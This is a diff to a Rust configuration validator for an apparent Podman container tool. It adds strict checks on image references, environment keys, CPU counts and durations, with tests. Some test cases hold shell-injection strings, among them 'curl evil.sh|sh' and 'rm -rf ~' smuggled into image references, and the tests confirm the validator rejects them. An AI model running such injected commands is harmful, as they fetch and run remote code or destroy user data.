@@ -26,6 +26,11 @@ impl Config {
 
         if self.image.base.trim().is_empty() {
             errors.push("image.base: must not be empty".into());
+        } else if !is_valid_image_ref(&self.image.base) {
+            errors.push(format!(
+                "image.base: '{}' is not a valid image reference (expected [registry/]name[:tag], no spaces or shell characters)",
+                self.image.base
+            ));
         }
         if self.image.name.trim().is_empty() {
             errors.push("image.name: must not be empty".into());
@@ -40,9 +45,9 @@ impl Config {
         if let Some(ref r) = self.image.image_ref {
             if r.trim().is_empty() {
                 errors.push("image.image: must not be empty when set".into());
-            } else if !r.contains(':') && !r.contains('/') {
+            } else if !is_valid_image_ref(r) {
                 errors.push(format!(
-                    "image.image: '{r}' does not look like a valid image reference (missing ':' or '/')"
+                    "image.image: '{r}' is not a valid image reference (expected [registry/]name[:tag][@sha256:<digest>], no spaces or shell characters)"
                 ));
             }
         }
@@ -114,7 +119,13 @@ impl Config {
             }
         }
         if let Some(ref cpus) = self.container.cpus {
-            if cpus.parse::<f64>().is_err() || cpus.parse::<f64>().unwrap_or(0.0) <= 0.0 {
+            // `NaN`/`inf` parse as f64 but are meaningless as CPU counts;
+            // without the finiteness check they sailed through to
+            // `PodmanArgs=--cpus=NaN`.
+            let valid = cpus
+                .parse::<f64>()
+                .is_ok_and(|v| v.is_finite() && v > 0.0 && v <= MAX_CPUS);
+            if !valid {
                 errors.push(format!(
                     "container.cpus: '{cpus}' is not a valid CPU count (e.g. '2.0', '0.5')"
                 ));
@@ -128,6 +139,11 @@ impl Config {
             }
         }
         for (key, val) in &self.container.env.values {
+            if !is_valid_env_key(key) {
+                errors.push(format!(
+                    "container.env: invalid key '{key}' (use ^[A-Za-z_][A-Za-z0-9_]*$)"
+                ));
+            }
             if key.contains('\n') {
                 errors.push(format!("container.env: key {key:?} contains newline"));
             }
@@ -212,8 +228,10 @@ impl Config {
         errors.extend(validate_provision(&self.provision));
         errors.extend(caches::validate_caches(self));
         for (i, pattern) in self.container.env.forward.iter().enumerate() {
+            // A trailing `*` marks a prefix forward (`FOO_*`); the key
+            // itself must still be a valid env name.
             let key = pattern.strip_suffix('*').unwrap_or(pattern);
-            if key.is_empty() || !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
+            if !is_valid_env_key(key) {
                 errors.push(format!(
                     "container.env.forward[{i}]: '{pattern}' must be an environment key or PREFIX_*"
                 ));
@@ -227,10 +245,10 @@ impl Config {
             if !valid_name {
                 errors.push(format!("container.services: invalid service name '{name}'"));
             }
-            let (command, env, restart) = match service {
-                crate::config::ServiceConfig::Short(command) => (command, None, "on-failure"),
+            let (command, env) = match service {
+                crate::config::ServiceConfig::Short(command) => (command, None),
                 crate::config::ServiceConfig::Detailed(detail) => {
-                    (&detail.command, Some(&detail.env), detail.restart.as_str())
+                    (&detail.command, Some(&detail.env))
                 }
             };
             if command.trim().is_empty() {
@@ -238,16 +256,12 @@ impl Config {
                     "container.services.{name}.command: must not be empty"
                 ));
             }
-            if !["never", "on-failure", "always"].contains(&restart) {
-                errors.push(format!(
-                    "container.services.{name}.restart: expected never, on-failure, or always"
-                ));
-            }
+            // `restart` is a `ServiceRestart` enum: unknown spellings fail
+            // at parse time with the valid list, so there is nothing to
+            // re-check here.
             if let Some(values) = env {
                 for (key, value) in values {
-                    if key.is_empty()
-                        || !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
-                        || key.as_bytes()[0].is_ascii_digit()
+                    if !is_valid_env_key(key)
                         || value.chars().any(|c| matches!(c, '\0' | '\n' | '\r'))
                     {
                         errors.push(format!(
@@ -258,27 +272,15 @@ impl Config {
             }
         }
 
-        if let Some(ref userns) = self.security.userns {
-            let valid_userns = ["keep-id", "nomap", "private"];
-            if !valid_userns.contains(&userns.as_str()) {
-                errors.push(format!(
-                    "security.userns: '{}' is invalid (expected one of: {})",
-                    userns,
-                    valid_userns.join(", ")
-                ));
-            }
-        }
+        // `security.userns` is a `UsernsMode` enum: unknown spellings fail
+        // at parse time with the valid list, so there is nothing to
+        // re-check here.
 
-        // Network validation
-        let valid_modes = ["host", "bridge", "none", "pasta", "slirp4netns", "private"];
-        if !valid_modes.contains(&self.network.mode.as_str()) {
-            errors.push(format!(
-                "network.mode: '{}' is invalid (expected one of: {})",
-                self.network.mode,
-                valid_modes.join(", ")
-            ));
-        }
-        if self.network.effective_mode() == "none" && !self.network.ports.is_empty() {
+        // Network validation. `network.mode` is a `NetworkMode` enum:
+        // unknown spellings fail at parse time with the valid list.
+        if self.network.effective_mode() == crate::config::NetworkMode::None
+            && !self.network.ports.is_empty()
+        {
             errors.push(
                 "network.ports: cannot publish ports when network mode is none/offline".into(),
             );
@@ -367,7 +369,7 @@ impl Config {
                 }
                 if *secret_type == crate::config::SecretType::Env
                     && let Some(t) = target
-                    && (t.is_empty() || !t.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_'))
+                    && !is_valid_env_key(t)
                 {
                     errors.push(format!(
                         "{prefix}.target: '{t}' must be a valid environment variable name"
@@ -446,12 +448,17 @@ impl Config {
 
         let t = &self.lifecycle.idle_timeout;
         if t != "off" {
-            let (digits, suffix) = parse_duration_suffix(t);
-            if digits.is_empty() || !matches!(suffix, Some('s' | 'm' | 'h')) {
+            if let Err(e) = parse_duration_secs(t) {
                 errors.push(format!(
-                    "lifecycle.idle_timeout: '{t}' is invalid (expected 'off', '30s', '5m', '1h')"
+                    "lifecycle.idle_timeout: '{t}' is invalid ({e}; expected 'off', '30s', '5m', '1h')"
                 ));
             }
+        }
+        if let Err(e) = parse_duration_secs(&self.image.pull_retry_delay) {
+            errors.push(format!(
+                "image.pull_retry_delay: '{}' is invalid ({e}; expected e.g. '5s')",
+                self.image.pull_retry_delay
+            ));
         }
 
         if errors.is_empty() {
@@ -510,12 +517,44 @@ fn is_portal_family(svc: &str) -> bool {
         || svc.starts_with("org.freedesktop.impl.portal")
 }
 
-/// Parse a duration string into (digit_part, suffix_char).
-fn parse_duration_suffix(s: &str) -> (String, Option<char>) {
+/// Upper bound for `container.cpus`: far above any real host, but finite so
+/// typos like `99999` fail fast instead of producing a puzzling runtime error.
+const MAX_CPUS: f64 = 1024.0;
+
+/// Parse a duration string (`30s`, `5m`, `1h`, `500ms`) into whole seconds.
+///
+/// The whole string must be consumed: leading/trailing junk (`5mx`, `m5`,
+/// empty) is an error, not silently ignored. Sub-second values truncate
+/// toward zero, so callers that need a positive duration keep rejecting
+/// them via the `0` they produce.
+pub fn parse_duration_secs(s: &str) -> Result<u64> {
     let trimmed = s.trim();
+    if trimmed.is_empty() {
+        anyhow::bail!("empty duration (expected e.g. '30s', '5m', '1h')");
+    }
     let digits: String = trimmed.chars().take_while(|c| c.is_ascii_digit()).collect();
-    let suffix = trimmed.chars().nth(digits.len());
-    (digits, suffix)
+    if digits.is_empty() {
+        anyhow::bail!("'{s}' does not start with a number (expected e.g. '30s', '5m', '1h')");
+    }
+    let rest = &trimmed[digits.len()..];
+    let value: u64 = digits
+        .parse()
+        .map_err(|_| anyhow::anyhow!("'{s}' is not a valid duration"))?;
+    let secs = match rest {
+        "ms" => value / 1000,
+        "s" => value,
+        "m" => value.saturating_mul(60),
+        "h" => value.saturating_mul(3600),
+        _ => {
+            anyhow::bail!(
+                "'{s}' has trailing characters after the duration (expected a single 's', 'm', 'h' or 'ms' suffix)"
+            );
+        }
+    };
+    if secs == 0 {
+        anyhow::bail!("'{s}' is not a positive duration (expected e.g. '30s', '5m', '1h')");
+    }
+    Ok(secs)
 }
 
 /// Convert an idle_timeout config string to seconds.
@@ -524,14 +563,7 @@ pub fn parse_idle_timeout_secs(s: &str) -> u64 {
     if s == "off" {
         return 0;
     }
-    let (digits, suffix) = parse_duration_suffix(s);
-    let value: u64 = digits.parse().unwrap_or(0);
-    match suffix {
-        Some('s') => value,
-        Some('m') => value.saturating_mul(60),
-        Some('h') => value.saturating_mul(3600),
-        _ => 0,
-    }
+    parse_duration_secs(s).unwrap_or(0)
 }
 
 pub fn is_valid_memory(s: &str) -> bool {
@@ -558,25 +590,133 @@ pub fn is_bare_memory_digits(s: &str) -> bool {
 /// Parse a provision `timeout` (`30s`, `5m`, `1h`) into seconds.
 /// Returns 0 when invalid or non-positive (callers treat 0 as invalid).
 pub fn parse_provision_timeout_secs(s: &str) -> u64 {
-    let (digits, suffix) = parse_duration_suffix(s);
-    if digits.is_empty() {
-        return 0;
+    parse_duration_secs(s).unwrap_or(0)
+}
+
+/// True for a well-formed OCI image reference:
+/// `[domain/]path[:tag][@sha256:<64 hex>]`.
+///
+/// Whitespace and shell metacharacters are rejected outright, so a
+/// crafted value (for example from a share link) can never flow into a
+/// shell command or a podman argument. Repository paths are lowercase,
+/// matching what registries accept.
+pub fn is_valid_image_ref(s: &str) -> bool {
+    if s.is_empty() || s.len() > 512 {
+        return false;
     }
-    let value: u64 = digits.parse().unwrap_or(0);
-    if value == 0 {
-        return 0;
+    if !s
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@'))
+    {
+        return false;
     }
-    // Entire string must be digits + single suffix.
-    let trimmed = s.trim();
-    if trimmed.len() != digits.len() + 1 {
-        return 0;
+    // Digest: at most one `@`, of the form `sha256:<64 hex>`.
+    let (rem, digest) = match s.split_once('@') {
+        Some((r, d)) => (r, Some(d)),
+        None => (s, None),
+    };
+    if let Some(d) = digest {
+        let hex = match d.strip_prefix("sha256:") {
+            Some(h) => h,
+            None => return false,
+        };
+        if hex.len() != 64 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
+            return false;
+        }
     }
-    match suffix {
-        Some('s') => value,
-        Some('m') => value.saturating_mul(60),
-        Some('h') => value.saturating_mul(3600),
-        _ => 0,
+    if rem.is_empty() {
+        return false;
     }
+    // Tag: the colon after the last slash (a `host:port/` prefix is not a
+    // tag). `[\w][\w.-]{0,127}` like the registry grammar.
+    let (name, tag) = match rem.rfind('/') {
+        Some(slash) => {
+            let after = &rem[slash + 1..];
+            match after.find(':') {
+                Some(i) => (&rem[..slash + 1 + i], Some(&after[i + 1..])),
+                None => (rem, None),
+            }
+        }
+        None => match rem.find(':') {
+            Some(i) => (&rem[..i], Some(&rem[i + 1..])),
+            None => (rem, None),
+        },
+    };
+    if let Some(t) = tag {
+        let mut chars = t.chars();
+        let first_ok = chars
+            .next()
+            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
+        if !first_ok
+            || t.len() > 128
+            || !chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
+        {
+            return false;
+        }
+    }
+    // Name: optional registry domain, then repository path components.
+    let mut parts = name.split('/');
+    let first = parts.next().unwrap_or_default();
+    let rest: Vec<&str> = parts.collect();
+    if first.contains('.') || first.contains(':') || first == "localhost" {
+        if rest.is_empty() || !is_valid_registry_domain(first) {
+            return false;
+        }
+    } else if !is_valid_path_component(first) {
+        return false;
+    }
+    rest.iter().all(|p| is_valid_path_component(p))
+}
+
+/// Registry host with an optional numeric port: lowercase DNS plus dots
+/// and dashes (`ghcr.io`, `localhost:5000`).
+fn is_valid_registry_domain(s: &str) -> bool {
+    let (host, port) = match s.split_once(':') {
+        Some((h, p)) => (h, Some(p)),
+        None => (s, None),
+    };
+    if host.is_empty()
+        || host.starts_with(['.', '-'])
+        || host.ends_with(['.', '-'])
+        || host.split('.').any(str::is_empty)
+        || !host
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-')
+    {
+        return false;
+    }
+    if let Some(p) = port {
+        if p.is_empty() || !p.chars().all(|c| c.is_ascii_digit()) {
+            return false;
+        }
+    }
+    true
+}
+
+/// One repository path component: lowercase alphanumerics separated by
+/// single `.`, `_` or `-` (no leading/trailing/double separators).
+fn is_valid_path_component(s: &str) -> bool {
+    if s.is_empty() {
+        return false;
+    }
+    let bytes = s.as_bytes();
+    if !bytes[0].is_ascii_alphanumeric() || !bytes[bytes.len() - 1].is_ascii_alphanumeric() {
+        return false;
+    }
+    let mut prev_sep = false;
+    for c in s.chars() {
+        if c.is_ascii_lowercase() || c.is_ascii_digit() {
+            prev_sep = false;
+        } else if c == '.' || c == '_' || c == '-' {
+            if prev_sep {
+                return false;
+            }
+            prev_sep = true;
+        } else {
+            return false;
+        }
+    }
+    true
 }
 
 fn is_valid_provision_name(s: &str) -> bool {
@@ -592,7 +732,11 @@ fn is_valid_provision_name(s: &str) -> bool {
         .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_')
 }
 
-fn is_valid_env_key(s: &str) -> bool {
+/// True for `^[A-Za-z_][A-Za-z0-9_]*$`: the single environment-name rule
+/// used by every env-bearing field (`container.env`, forwards, service and
+/// provision env, systemd secret targets). Codegen no longer re-checks
+/// names; validation rejects them with a field path instead.
+pub fn is_valid_env_key(s: &str) -> bool {
     if s.is_empty() {
         return false;
     }
@@ -705,5 +849,203 @@ mod name_tests {
     fn enforces_length_limit() {
         assert!(validate_container_name("container", &"a".repeat(63)).is_ok());
         assert!(validate_container_name("container", &"a".repeat(64)).is_err());
+    }
+}
+
+#[cfg(test)]
+mod numeric_duration_tests {
+    use super::parse_duration_secs;
+    use crate::config::Config;
+
+    fn minimal(image_extra: &str, container_extra: &str, tail: &str) -> String {
+        format!(
+            "[image]\nbase = \"fedora:41\"\nname = \"env\"\n{image_extra}\
+             [container]\nname = \"env\"\nhome = \"~/env\"\n{container_extra}\
+             {tail}\n"
+        )
+    }
+
+    #[test]
+    fn valid_durations_parse() {
+        assert_eq!(parse_duration_secs("90s").unwrap(), 90);
+        assert_eq!(parse_duration_secs("5m").unwrap(), 300);
+        assert_eq!(parse_duration_secs("1h").unwrap(), 3600);
+        assert_eq!(parse_duration_secs(" 10s ").unwrap(), 10);
+    }
+
+    #[test]
+    fn trailing_junk_and_empty_are_rejected() {
+        for bad in ["5mx", "m5", "", "off", "5", "0s", "500ms", "-5s"] {
+            assert!(parse_duration_secs(bad).is_err(), "should reject {bad:?}");
+        }
+    }
+
+    #[test]
+    fn non_finite_and_non_positive_cpus_are_rejected() {
+        for bad in ["NaN", "inf", "-inf", "-1", "0", "0.0", "999999"] {
+            let err = Config::parse(&minimal("", &format!("cpus = \"{bad}\"\n"), ""))
+                .expect_err(&format!("cpus = {bad:?} must fail validation"));
+            assert!(
+                err.to_string().contains("container.cpus"),
+                "error should name the field: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn ordinary_cpus_are_accepted() {
+        for good in ["2.0", "0.5", "16"] {
+            Config::parse(&minimal("", &format!("cpus = \"{good}\"\n"), ""))
+                .expect(&format!("cpus = {good:?} should validate"));
+        }
+    }
+
+    #[test]
+    fn idle_timeout_with_trailing_junk_is_rejected() {
+        let err = Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5mx\"\n"))
+            .expect_err("idle_timeout with trailing junk must fail");
+        assert!(err.to_string().contains("lifecycle.idle_timeout"), "{err}");
+        Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5m\"\n"))
+            .expect("a plain duration should validate");
+    }
+
+    #[test]
+    fn pull_retry_delay_is_duration_checked() {
+        let err = Config::parse(&minimal("pull_retry_delay = \"5x\"\n", "", ""))
+            .expect_err("pull_retry_delay with bad suffix must fail");
+        assert!(err.to_string().contains("image.pull_retry_delay"), "{err}");
+    }
+}
+
+#[cfg(test)]
+mod env_key_tests {
+    use super::is_valid_env_key;
+    use crate::config::Config;
+
+    fn base() -> String {
+        "[image]\nbase = \"fedora:41\"\nname = \"env\"\n\
+         [container]\nname = \"env\"\nhome = \"~/env\"\n"
+            .to_string()
+    }
+
+    #[test]
+    fn key_grammar() {
+        for bad in ["1ABC", "A-B", "Ä", "", "A B", "A=B"] {
+            assert!(!is_valid_env_key(bad), "should reject {bad:?}");
+        }
+        for good in ["_A1", "PATH", "_", "A1_b2"] {
+            assert!(is_valid_env_key(good), "should accept {good:?}");
+        }
+    }
+
+    #[test]
+    fn container_env_values_are_checked() {
+        let err = Config::parse(&(base() + "[container.env]\n1ABC = \"x\"\n"))
+            .expect_err("bad container.env key must fail");
+        assert!(err.to_string().contains("container.env"), "{err}");
+    }
+
+    #[test]
+    fn container_env_forward_patterns_are_checked() {
+        let err = Config::parse(&(base() + "[container.env]\nforward = [\"1ABC\"]\n"))
+            .expect_err("bad forward pattern must fail");
+        assert!(err.to_string().contains("container.env.forward"), "{err}");
+        Config::parse(&(base() + "[container.env]\nforward = [\"FOO_*\"]\n"))
+            .expect("PREFIX_* forwards should validate");
+    }
+
+    #[test]
+    fn service_env_is_checked() {
+        let err = Config::parse(
+            &(base()
+                + "[container.services.web]\ncommand = \"x\"\n[container.services.web.env]\nA-B = \"x\"\n"),
+        )
+        .expect_err("bad service env key must fail");
+        assert!(
+            err.to_string().contains("container.services.web.env"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn provision_env_is_checked() {
+        let err = Config::parse(
+            &(base() + "[[provision]]\nname = \"step\"\nrun = \"echo\"\n[provision.env]\n\"Ä\" = \"x\"\n"),
+        )
+        .expect_err("bad provision env key must fail");
+        assert!(err.to_string().contains("provision[0].env"), "{err}");
+    }
+
+    #[test]
+    fn systemd_secret_targets_are_checked() {
+        let err = Config::parse(
+            &(base()
+                + "[[security.secrets]]\nname = \"tok\"\nsource = \"systemd\"\npath = \"/run/x\"\ntype = \"env\"\ntarget = \"1ABC\"\n"),
+        )
+        .expect_err("bad secret target must fail");
+        assert!(
+            err.to_string().contains("security.secrets[0].target"),
+            "{err}"
+        );
+    }
+}
+
+#[cfg(test)]
+mod image_ref_tests {
+    use super::is_valid_image_ref;
+    use crate::config::Config;
+
+    #[test]
+    fn valid_refs_are_accepted() {
+        for good in [
+            "fedora:41",
+            "fedora",
+            "dev-latest",
+            "ubuntu:22.04",
+            "ghcr.io/bethropolis/podbox:dev-latest",
+            "ghcr.io/a/b:1",
+            "localhost:5000/mybox:latest",
+            "docker.io/library/archlinux:latest",
+            "alpine:3.20",
+            "myrepo/myimage@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+            "ghcr.io/a/b:1@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+        ] {
+            assert!(is_valid_image_ref(good), "should accept {good:?}");
+        }
+    }
+
+    #[test]
+    fn shell_characters_and_malformed_refs_are_rejected() {
+        for bad in [
+            "",
+            " ",
+            "ghcr.io/a/b:1 --name x; curl evil.sh|sh #",
+            "a;rm -rf ~",
+            "$(evil)",
+            "`evil`",
+            "a'b",
+            "a\"b",
+            "a/b\\c",
+            "UPPER/repo:tag",
+            "a//b",
+            "/a",
+            "a/",
+            ":tag",
+            "a:",
+            "-bad/x",
+            "a:b:c",
+            "a@sha256:xyz",
+            "a@md5:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+            "a..b/c",
+        ] {
+            assert!(!is_valid_image_ref(bad), "should reject {bad:?}");
+        }
+    }
+
+    #[test]
+    fn crafted_share_link_ref_fails_validation() {
+        let toml = "[image]\nbase = \"fedora:41\"\nname = \"env\"\nimage = \"ghcr.io/a/b:1 --name x; curl evil.sh|sh #\"\n[container]\nname = \"env\"\nhome = \"~/env\"\n";
+        let err = Config::parse(toml).expect_err("crafted ref must fail validation");
+        assert!(err.to_string().contains("image.image"), "{err}");
     }
 }
